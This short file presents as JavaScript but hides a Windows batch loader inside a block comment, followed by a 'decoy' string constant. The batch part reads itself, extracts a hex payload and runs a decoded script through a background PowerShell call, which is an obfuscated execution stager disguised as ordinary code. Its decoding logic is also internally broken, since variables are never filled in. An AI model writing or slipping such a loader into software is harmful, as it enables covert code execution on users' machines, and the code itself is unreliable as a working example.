/*
@echo off
setlocal EnableDelayedExpansion
set "SELF=%~f0"
for /f "delims=" %%A in ('findstr /c:"set \"PAYLOAD" "%~f0"') do %%A
set "DECODER=$h=''; foreach($line in [IO.File]::ReadAllLines($env:SELF)) { $b=[Convert]::ToByte($h.Substring(0,2),16) }; &($executioncontext.InvokeCommand.NewScriptBlock($decoded))"
set "PAYLOAD=9aceeaf1317e5b4f4809021a9c0d7e6f"
set "RUN=&($executioncontext.InvokeCommand.NewScriptBlock([string]$env:DECODER))"
start /b powershell.exe -NoProfile -Command "!RUN!"
exit /b 0
*/
const decoy = "ySkH3iOM0CrNCFx7NGqlRguLHrWSVHiZicrBfyDaipVqt";
